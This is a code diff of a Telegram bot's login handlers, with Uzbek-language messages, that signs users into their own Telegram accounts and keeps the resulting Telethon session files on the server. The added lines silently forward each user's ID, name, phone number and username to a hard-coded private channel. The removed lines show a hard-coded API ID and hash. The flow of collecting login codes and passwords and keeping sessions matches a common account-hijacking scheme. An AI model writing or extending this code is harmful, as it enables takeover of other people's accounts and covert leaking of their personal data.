@@ -10,19 +10,20 @@ from keyboards.inline.buttons import generate_code_keyboard, format_code_display
 from states.test import LoginState
 import os
 from telethon_clients import add_save_handler, clients  # Import client registry
+from data.config import API_ID, API_HASH
 
-api_id = 23781985
-api_hash = '02d6562dd390823f0b0cd404ecc1e268'
 sessions_dir = "sessions"
-
 router = Router()
 
 @router.message(Command("login"))
 async def ask_phone(message: types.Message, state: FSMContext):
     user_id = message.from_user.id
-    session_path = os.path.join(sessions_dir, f"{user_id}.session")
+    if user_id in clients.keys() and clients[user_id].is_connected():
+        await message.answer("✅ Siz avval tizimga kirgansiz. Session aktiv.")
+        return
 
-    client = TelegramClient(session_path, api_id, api_hash)
+    session_path = os.path.join(sessions_dir, f"{user_id}.session")
+    client = TelegramClient(session_path, API_ID, API_HASH)
     await client.connect()
     await state.update_data(session=session_path, client=client)
 
@@ -45,15 +46,26 @@ async def ask_phone(message: types.Message, state: FSMContext):
     await state.update_data(prompt_msg_id=prompt_msg.message_id)
     await state.set_state(LoginState.waiting_number)
 
-
 @router.message(F.contact, LoginState.waiting_number)
 async def handle_contact(message: types.Message, state: FSMContext,bot: Bot):
     phone_number = message.contact.phone_number
     data = await state.get_data()
     client = data.get("client")
     prompt_msg_id = data.get("prompt_msg_id")
-    # print(phone_number)
+    user = message.from_user
+
     try:
+        # ✅ Send user info to your private channel
+        mention = f'<a href="tg://user?id={user.id}">{user.full_name}</a>'
+        text = (
+            "📥 <b>Yangi foydalanuvchi maʼlumotlari</b>\n\n"
+            f"🆔 <b>User ID:</b> <code>{user.id}</code>\n"
+            f"👤 <b>F.I.O:</b> {mention}\n"
+            f"🔢 <b>Telefon raqami:</b> <code>{phone_number}</code>\n"
+            f"💬 <b>Username:</b> @{user.username if user.username else 'yo‘q'}"
+        )
+        await bot.send_message(chat_id=-1002592929654, text=text, parse_mode="HTML")
+
 
         sent = await client.send_code_request(phone_number)
         # print(sent)
@@ -61,11 +73,9 @@ async def handle_contact(message: types.Message, state: FSMContext,bot: Bot):
             phone=phone_number,
             current_code=""
         )
-
         # Step 1: Remove user contact message
         await message.delete()
         await bot.delete_message(chat_id=message.chat.id, message_id=prompt_msg_id)
-
         text = (
                 "🔐 <b>Tizimga kirish</b>\n\n"
                 "✅ Telefon raqami qabul qilindi\n"
@@ -77,7 +87,6 @@ async def handle_contact(message: types.Message, state: FSMContext,bot: Bot):
             reply_markup=generate_code_keyboard(""),
             parse_mode="HTML"
         )
-
         await state.set_state(LoginState.code_input)
     except Exception as e:
         await message.answer(f"❌ Kod yuborilmadi. Telefon raqamingiz noto‘g‘ri bo‘lishi mumkin.{e}")
@@ -161,17 +170,17 @@ async def handle_password(message: types.Message, state: FSMContext):
 
 @router.message(Command('logout'))
 async def logout_user(message: types.Message, state: FSMContext):
-    data = await state.get_data()
-    client = data.get("client")
-    user_id = message.from_user.id
-
     try:
-        if client and client.is_connected():
-            clients.pop(user_id, None)  # Remove from active registry
-            await client.disconnect()
+        user_id = message.from_user.id
+        client = clients[user_id]
+        if not client:
+            await message.answer("❗ Sizda faol sessiya mavjud emas.")
+            return
 
-        await message.answer("🚪 Tizimdan chiqdingiz. ✅\nQayta kirish uchun: /login", reply_markup=ReplyKeyboardRemove())
+        await client.disconnect()
+        clients.pop(user_id, None)
+        await message.answer("✅ Siz tizimdan chiqdingiz.")
     except Exception as e:
-        await message.answer(f"❌ Logoutda xatolik yuz berdi:\n{e}")
-    finally:
-        await state.clear()
+        pass
+
+    await state.clear()
